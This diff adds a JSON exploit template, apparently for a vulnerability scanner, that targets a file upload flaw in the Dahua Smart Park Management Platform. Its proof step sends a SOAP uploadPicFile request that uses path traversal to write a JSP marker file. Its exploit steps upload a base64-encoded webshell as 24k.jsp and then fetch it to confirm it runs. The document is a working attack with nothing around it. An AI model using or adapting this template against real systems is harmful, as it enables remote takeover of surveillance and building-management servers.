@@ -1,0 +1,39 @@
+{
+	"name":"大华智慧园区管理平台poi文件上传",
+	"tag":"dahua",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/emap/webservice/gis/soap/poi",
+		"pocPost":"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <res:uploadPicFile>\r\n         <!--type: string-->\r\n         <arg0>/../../test.jsp</arg0>\r\n         <!--type: base64Binary-->\r\n         <arg1>PCVvdXQucHJpbnQoIjExbnh4Iik7JT4=</arg1>\r\n      </res:uploadPicFile>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>\r\n",
+		"header":{
+			"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv",
+			"Content-Length":" 444"
+		},
+		"status_code":"200",
+		"pattern":"(<ns2:return><code>1</code>)"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/emap/webservice/gis/soap/poi",
+			"expPost":"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <res:uploadPicFile>\r\n         <!--type: string-->\r\n         <arg0>/../../24k.jsp</arg0>\r\n         <!--type: base64Binary-->\r\n         <arg1>{{webshell:Base64Encode}}</arg1>\r\n      </res:uploadPicFile>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>",
+			"header":{
+				"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+				"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv",
+				"Content-Length":" 444"
+			},
+			"status_code":"200",
+			"pattern":"(<ns2:return><code>1</code>)"
+		},
+		"step2":{
+			"expGet":"/upload/24k.jsp",
+			"header":{
+				"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+				"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv",
+				"Content-Length":" 444"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		}
+	}
+}
